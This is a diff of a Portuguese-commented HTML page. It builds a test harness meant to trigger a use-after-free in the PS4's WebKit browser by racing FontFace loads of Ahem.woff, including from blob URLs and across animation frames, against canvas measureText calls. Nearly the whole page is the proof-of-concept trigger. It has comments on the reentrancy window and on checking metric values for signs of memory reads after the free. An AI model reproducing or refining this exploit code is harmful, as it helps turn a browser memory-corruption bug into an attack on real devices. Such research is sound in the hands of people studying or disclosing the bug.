@@ -1,46 +1,408 @@
 <!DOCTYPE html>
-<html>
+<html lang="pt">
+<head>
+<meta charset="UTF-8">
+<title>PS4 WebKit UAF — Ahem.woff Timing Race</title>
+<style>
+body{font-family:monospace;background:#0a0a0a;color:#ccc;padding:14px;margin:0;font-size:11px;}
+h1{color:#fff;font-size:13px;margin:0 0 4px;}
+p{color:#777;font-size:11px;margin:2px 0 6px;line-height:1.4;}
+.btn{display:inline-block;padding:6px 14px;border:none;border-radius:3px;
+     font-size:11px;cursor:pointer;margin:2px 1px;font-family:monospace;}
+.run{background:#1a5;color:#fff} .danger{background:#a21;color:#fff}
+.diag{background:#235;color:#9cf} .info2{background:#333;color:#aaa}
+#log{white-space:pre-wrap;font-size:11px;background:#000;padding:10px;
+     border:1px solid #222;max-height:540px;overflow-y:auto;
+     margin-top:8px;border-radius:3px;line-height:1.6;}
+.ok{color:#3f3}.wa{color:#fa3}.er{color:#f44}
+.hd{color:#8af;font-weight:bold}.dm{color:#444}
+</style>
+</head>
 <body>
-<button id="run">run</button>
+<h1>PS4 WebKit UAF — Ahem.woff (fonte válida) + Timing Race</h1>
+<p>
+  data: URLs falham com NetworkError no PS4 → usar arquivo real.<br>
+  Ahem.woff é uma fonte válida: carregamento bem-sucedido ativa
+  <code>fontLoaded → fontLoadEventOccurred → dispatchInvalidationCallbacks → UAF</code>.
+</p>
+<div>
+  <button class="btn diag"   onclick="runB0()">B0 — Verificar se Ahem.woff carrega</button>
+  <button class="btn danger" onclick="runB1()">B1 — Race: Ahem loading + measureText imediato</button>
+  <button class="btn danger" onclick="runB2()">B2 — Race: Blob URL (fonte em memória)</button>
+  <button class="btn danger" onclick="runB3()">B3 — Race: Múltiplos frames RAF</button>
+  <button class="btn run"    onclick="runAll()">▶ Todos</button>
+  <button class="btn info2"  onclick="clearLog()">Limpar</button>
+</div>
+<div id="log"></div>
+
 <script>
-function runTest() {
-    const dummies = [];
-    for (let i = 0; i < 600; i++) {
-        const c = document.createElement('canvas');
-        c.width = 1;
-        c.height = 1;
-        const ctx = c.getContext('2d');
-        ctx.font = '10px "dummy' + i + '"';
-        dummies.push(c, ctx);
-    }
+/* ─── LOG ─── */
+const L=document.getElementById('log');
+function log(m,c){const s=document.createElement('span');if(c)s.className=c;s.textContent=m+'\n';L.appendChild(s);L.scrollTop=L.scrollHeight;}
+function sep(){log('─'.repeat(60),'dm');}
+function hdr(t){sep();log('  '+t,'hd');sep();}
+function ok(t){log('  ✓ '+t,'ok');}
+function warn(t){log('  ⚠ '+t,'wa');}
+function err(t){log('  ✗ '+t,'er');}
+function info(t){log('  · '+t);}
+function clearLog(){L.textContent='';}
 
-    const pendingFontURL = 'url("data:font/ttf;base64,' + 'A'.repeat(1100000) + '")';
-    const keepAlive = [];
+/* Ajustar o caminho conforme a URL real do arquivo no PS4 */
+const AHEM_WOFF = 'resources/Ahem.woff';
+const AHEM_OTF  = 'resources/Ahem.otf';
 
-    for (let attempt = 0; attempt < 8; attempt++) {
-        const metricsDonor = new FontFace('metricsDonor' + attempt, pendingFontURL);
-        const measured = new FontFace('measured' + attempt, pendingFontURL, { unicodeRange: 'U+13A0-13FF' });
-        document.fonts.add(metricsDonor);
-        document.fonts.add(measured);
-
-        const c = document.createElement('canvas');
-        c.width = 64;
-        c.height = 64;
-        const ctx = c.getContext('2d');
-        ctx.font = '10px metricsDonor' + attempt + ', measured' + attempt;
-        keepAlive.push(metricsDonor, measured, c, ctx);
-
-        const tm = ctx.measureText('\u13A0\u13A2\u13A4');
-        void tm.fontBoundingBoxAscent;
-        void tm.fontBoundingBoxDescent;
-        void tm.emHeightAscent;
-        void tm.emHeightDescent;
-        void tm.hangingBaseline;
-        void tm.ideographicBaseline;
-    }
+function buildDummies(n){
+  const a=[];
+  for(let i=0;i<n;i++){
+    const c=document.createElement('canvas');c.width=1;c.height=1;
+    const ctx=c.getContext('2d');
+    ctx.font='10px "ps4d_'+i+'_'+Math.random().toString(36).slice(2)+'"';
+    a.push(c,ctx);
+  }
+  return a;
+}
+function readMetrics(tm){
+  return {
+    fba: tm.fontBoundingBoxAscent,
+    fbd: tm.fontBoundingBoxDescent,
+    ema: tm.emHeightAscent,
+    emd: tm.emHeightDescent,
+    hb:  tm.hangingBaseline,
+    ib:  tm.ideographicBaseline,
+  };
 }
 
-document.getElementById('run').addEventListener('click', runTest);
+/* ═══════════════════════════════════════════════════════════
+   B0 — Verificar se Ahem.woff carrega no PS4
+
+   Diferença crucial vs data: URLs:
+   - data: URLs → NetworkError (bloqueadas no PS4)
+   - Arquivo local válido → deve carregar com SUCESSO
+
+   Quando carrega com sucesso:
+     CSSFontFaceSource: status → Success
+     → CSSFontFace::fontLoaded(source) chamado
+     → fontLoadEventOccurred() → iterateClients → dispatchInvalidationCallbacks
+     → fontsNeedUpdate → chain → potencial UAF!
+
+   Este teste confirma se Ahem.woff é utilizável como gatilho.
+   ═══════════════════════════════════════════════════════════ */
+async function runB0() {
+  hdr('B0 — Verificar se Ahem.woff/.otf carrega corretamente');
+
+  for(const path of [AHEM_WOFF, AHEM_OTF]) {
+    info('Testando: ' + path);
+    try {
+      // Teste 1: fetch direto para ver se o arquivo existe
+      const resp = await fetch(path);
+      if(resp.ok) {
+        const size = resp.headers.get('content-length') || '?';
+        ok(path + ' acessível via fetch (status=' + resp.status + ' size=' + size + ')');
+      } else {
+        warn(path + ' fetch retornou status=' + resp.status);
+        continue;
+      }
+
+      // Teste 2: carregar como FontFace
+      const f = new FontFace('ahemTest', 'url("' + path + '")');
+      document.fonts.add(f);
+      info('  Antes de f.load(): status=' + f.status);
+
+      try {
+        await f.load();
+        ok('  f.load() RESOLVEU! status=' + f.status);
+        ok('  → Ahem.woff pode ser usado como gatilho de fontLoadEventOccurred!');
+
+        // Medir métricas com fonte carregada (devem ser DIFERENTES do interstitial 11)
+        const c   = document.createElement('canvas');
+        c.width   = 200; c.height = 64;
+        const ctx = c.getContext('2d');
+        ctx.font  = '20px ahemTest';
+        const tm  = ctx.measureText('Abc');
+        info('  Métricas com Ahem carregado:');
+        info('    fontBBoxAscent  = ' + tm.fontBoundingBoxAscent  + ' (interstitial seria 11)');
+        info('    fontBBoxDescent = ' + tm.fontBoundingBoxDescent + ' (interstitial seria 2)');
+        info('    emHeightAscent  = ' + tm.emHeightAscent);
+        if(tm.fontBoundingBoxAscent !== 11) {
+          ok('  MÉTRICAS DIFERENTES DO INTERSTITIAL → Ahem carregou de verdade!');
+        } else {
+          warn('  Métricas = 11 (igual ao interstitial) → pode não ter carregado');
+        }
+      } catch(e2) {
+        warn('  f.load() rejeitou: ' + e2 + ' (status=' + f.status + ')');
+        if(String(e2).includes('NetworkError')) {
+          err('  → NetworkError — arquivo de fonte bloqueado no PS4');
+        }
+      }
+      document.fonts.delete(f);
+    } catch(e) {
+      err('  Erro ao testar ' + path + ': ' + e);
+    }
+  }
+}
+
+/* ═══════════════════════════════════════════════════════════
+   B1 — Race: Ahem.woff loading + measureText imediato
+
+   Estratégia de timing:
+   1. Criar 100 dummies (pressão no cache)
+   2. Adicionar FontFace com url("Ahem.woff") ao document.fonts
+   3. Chamar f.load() → status vira "loading" sincronamente
+   4. SEM AWAIT — measureText() IMEDIATAMENTE
+   5. Durante o glyph walk (C++), se Ahem.woff completar o load:
+      fontLoaded() → fontLoadEventOccurred() → chain → UAF!
+
+   Por que pode funcionar diferente do data: URL:
+   - Ahem.woff é um arquivo local pequeno e VÁLIDO
+   - Pode carregar em µs vs 200ms do data: URL
+   - Uma fonte VÁLIDA dispara fontLoaded com Success (não Failure)
+   - Success → setStatus(Success) → fontLoadEventOccurred → UAF chain
+
+   Timing ideal: load completa DURANTE a chamada measureText C++
+   ═══════════════════════════════════════════════════════════ */
+function runB1() {
+  hdr('B1 — Race: Ahem.woff loading + measureText imediato (sem await)');
+  info('Fonte válida: fontLoaded(Success) → fontLoadEventOccurred → UAF chain');
+
+  const dummies = buildDummies(100);
+  const keepAlive = [];
+  const results = [];
+
+  try {
+    for(let i = 0; i < 8; i++) {
+      // donor: sem unicodeRange → é a fonte PRIMÁRIA (metricsOfPrimaryFont)
+      const donor = new FontFace('b1donor_'+i, 'url("'+AHEM_WOFF+'")');
+      // target: cobre U+13A0–13FF → o glyph walk de \u13A0 usa esta fonte
+      const target = new FontFace('b1target_'+i, 'url("'+AHEM_WOFF+'")',
+        {unicodeRange:'U+13A0-13FF'});
+
+      document.fonts.add(donor);
+      document.fonts.add(target);
+
+      /* ─── JANELA DE REENTRÂNCIA ───
+         .load() → pump(Allow) → source->load() → status=loading
+         IMEDIATAMENTE: measureText → width() → glyph walk
+         Se Ahem.woff completa DURANTE o glyph walk:
+           fontLoaded(source) → fontLoadEventOccurred → chain → UAF */
+      donor.load().catch(()=>{});
+      target.load().catch(()=>{});
+
+      const c   = document.createElement('canvas');
+      c.width   = 64; c.height = 64;
+      const ctx = c.getContext('2d');
+      ctx.font  = '10px b1donor_'+i+', b1target_'+i;
+      keepAlive.push(donor, target, c, ctx, ...dummies);
+
+      // measureText SEM AWAIT — máxima proximidade temporal ao load()
+      const tm = ctx.measureText('\u13A0\u13A2\u13A4');
+      const m  = readMetrics(tm);
+      results.push(m.fba);
+      info('i='+i+' fba='+m.fba+' ema='+m.ema+
+           ' donor='+donor.status+' target='+target.status);
+    }
+
+    const unique = [...new Set(results)];
+    if(unique.length > 1) {
+      warn('VALORES DIFERENTES entre iterações: '+results.join(', '));
+      warn('→ Possível leitura de memória após UAF!');
+    } else {
+      ok('B1 sem crash — fba='+unique[0]+' (consistente)');
+      if(unique[0] !== 11) ok('  Valor != 11 → Ahem carregou e influenciou métricas!');
+    }
+  } catch(e) {
+    err('EXCEÇÃO em B1: '+e);
+  }
+}
+
+/* ═══════════════════════════════════════════════════════════
+   B2 — Race: Blob URL (fonte em memória — carregamento mais rápido)
+
+   Pre-fetch Ahem.woff → Blob URL → dados já em RAM
+   Blob URL resolve muito mais rápido que requisição de arquivo
+   → janela de reentrância maior
+
+   Variações:
+   B2a: Pre-fetch → Blob → load() → measureText imediato
+   B2b: Pre-fetch → Blob → measureText sem chamar load()
+        (a política Allow do glyph walk deveria iniciar o load)
+   ═══════════════════════════════════════════════════════════ */
+async function runB2() {
+  hdr('B2 — Race: Blob URL (Ahem em memória) + measureText');
+
+  let blobURL = null;
+  try {
+    info('Fazendo fetch de Ahem.woff para criar Blob URL...');
+    const resp = await fetch(AHEM_WOFF);
+    if(!resp.ok) {
+      // tentar .otf
+      const resp2 = await fetch(AHEM_OTF);
+      if(!resp2.ok) { err('Ahem.woff e Ahem.otf não encontrados'); return; }
+      const blob2 = await resp2.blob();
+      blobURL = URL.createObjectURL(blob2);
+      info('Usando Ahem.otf como Blob URL');
+    } else {
+      const blob = await resp.blob();
+      blobURL = URL.createObjectURL(blob);
+      info('Usando Ahem.woff como Blob URL');
+    }
+    ok('Blob URL criada: dados de fonte em memória → carregamento ~instantâneo');
+  } catch(e) {
+    err('Não foi possível fazer fetch de Ahem: '+e);
+    return;
+  }
+
+  const dummies = buildDummies(100);
+  const keepAlive = [];
+  const results = [];
+
+  try {
+    for(let i = 0; i < 8; i++) {
+      const donor  = new FontFace('b2donor_'+i,  'url("'+blobURL+'")');
+      const target = new FontFace('b2target_'+i, 'url("'+blobURL+'")',
+        {unicodeRange:'U+13A0-13FF'});
+
+      document.fonts.add(donor);
+      document.fonts.add(target);
+
+      /* Blob URL: dados já em RAM → load() deve completar em µs
+         Se completar DURANTE o glyph walk abaixo → UAF */
+      donor.load().catch(()=>{});
+      target.load().catch(()=>{});
+
+      const c   = document.createElement('canvas');
+      c.width   = 64; c.height = 64;
+      const ctx = c.getContext('2d');
+      ctx.font  = '10px b2donor_'+i+', b2target_'+i;
+      keepAlive.push(donor, target, c, ctx, ...dummies);
+
+      const tm = ctx.measureText('\u13A0\u13A2\u13A4');
+      const m  = readMetrics(tm);
+      results.push(m.fba);
+      info('i='+i+' fba='+m.fba+' donor='+donor.status+' target='+target.status);
+    }
+
+    const unique = [...new Set(results)];
+    if(unique.length > 1) {
+      warn('VALORES DIFERENTES: '+results.join(', ')+' → possível UAF');
+    } else {
+      ok('B2 sem crash — fba='+unique[0]);
+      if(unique[0] !== 11) {
+        ok('  Valor != 11 → Blob URL carregou e influenciou métricas!');
+        warn('  → Testar B1 e B3 com mesma Blob URL para maximizar pressão');
+      }
+    }
+  } catch(e) {
+    err('EXCEÇÃO em B2: '+e);
+  } finally {
+    if(blobURL) URL.revokeObjectURL(blobURL);
+  }
+}
+
+/* ═══════════════════════════════════════════════════════════
+   B3 — Race: múltiplos frames RAF com Blob URL
+
+   requestAnimationFrame cria janelas de timing precisas.
+   Estratégia:
+   1. Frame 1: criar fontes + iniciar load()
+   2. Frame 2: measureText (neste frame o load pode ter completado)
+   3. Frame 3: outro measureText (fonte agora em Success)
+
+   Comparar fba entre os frames:
+   - Frame 2 com fba diferente de Frame 3 → possível UAF
+   - Frame 2 com crash → UAF confirmado
+   ═══════════════════════════════════════════════════════════ */
+async function runB3() {
+  hdr('B3 — Race: Múltiplos frames RAF + Blob URL');
+
+  let blobURL = null;
+  try {
+    const resp = await fetch(AHEM_WOFF).catch(() => fetch(AHEM_OTF));
+    if(!resp || !resp.ok) { err('Ahem não encontrado para B3'); return; }
+    blobURL = URL.createObjectURL(await resp.blob());
+    ok('Blob URL pronta');
+  } catch(e) { err('fetch falhou: '+e); return; }
+
+  const dummies  = buildDummies(100);
+  const keepAlive = [];
+  const frameResults = [];
+
+  for(let attempt = 0; attempt < 4; attempt++) {
+    await new Promise(resolve => {
+      requestAnimationFrame(() => {
+        // Frame A: criar fontes e iniciar load
+        const donor  = new FontFace('b3donor_'+attempt,  'url("'+blobURL+'")');
+        const target = new FontFace('b3target_'+attempt, 'url("'+blobURL+'")',
+          {unicodeRange:'U+13A0-13FF'});
+        document.fonts.add(donor);
+        document.fonts.add(target);
+        donor.load().catch(()=>{});
+        target.load().catch(()=>{});
+
+        requestAnimationFrame(() => {
+          // Frame B: measureText logo após o load iniciar
+          // Se o load completou entre os frames → fontLoaded disparou
+          // e agora o cache foi atualizado → fontMetrics pode ser stale
+          try {
+            const c   = document.createElement('canvas');
+            c.width   = 64; c.height = 64;
+            const ctx = c.getContext('2d');
+            ctx.font  = '10px b3donor_'+attempt+', b3target_'+attempt;
+            keepAlive.push(donor, target, c, ctx, ...dummies);
+
+            const tm1 = ctx.measureText('\u13A0\u13A2\u13A4');
+            const m1  = readMetrics(tm1);
+
+            requestAnimationFrame(() => {
+              // Frame C: segundo measureText (fonte provavelmente em Success)
+              try {
+                const tm2 = ctx.measureText('\u13A0\u13A2\u13A4');
+                const m2  = readMetrics(tm2);
+
+                frameResults.push({attempt, fb:m1.fba, fc:m2.fba,
+                                   dStatus:donor.status, tStatus:target.status});
+                info('attempt='+attempt+' frameB_fba='+m1.fba+
+                     ' frameC_fba='+m2.fba+
+                     ' donor='+donor.status+' target='+target.status);
+                if(m1.fba !== m2.fba) {
+                  warn('  frameB != frameC: '+m1.fba+' vs '+m2.fba+' → transição detectada!');
+                }
+              } catch(e) { err('Frame C exceção: '+e); }
+              resolve();
+            });
+          } catch(e) { err('Frame B exceção: '+e); resolve(); }
+        });
+      });
+    });
+  }
+
+  // Análise dos resultados
+  const fbVals = frameResults.map(r => r.fb);
+  const fcVals = frameResults.map(r => r.fc);
+  const allFba = [...new Set([...fbVals, ...fcVals])];
+
+  if(allFba.length > 1) {
+    warn('VALORES VARIADOS entre frames: '+allFba.join(', ')+' → transição capturada');
+    warn('→ Indica que o load completou entre frames e mudou as métricas');
+    warn('→ Ajustar timing para capturar o momento EXATO durante measureText');
+  } else {
+    ok('B3 sem crash — fba='+allFba[0]+' consistente');
+    if(allFba[0] !== 11) {
+      ok('  Valor != 11 → Ahem carregou e mudou as métricas!');
+      ok('  → Usar este valor para calibrar janela de timing em B1/B2');
+    }
+  }
+
+  if(blobURL) URL.revokeObjectURL(blobURL);
+}
+
+/* ─── runAll ─── */
+async function runAll() {
+  clearLog();
+  await runB0();
+  runB1();
+  await runB2();
+  await runB3();
+}
 </script>
 </body>
 </html>
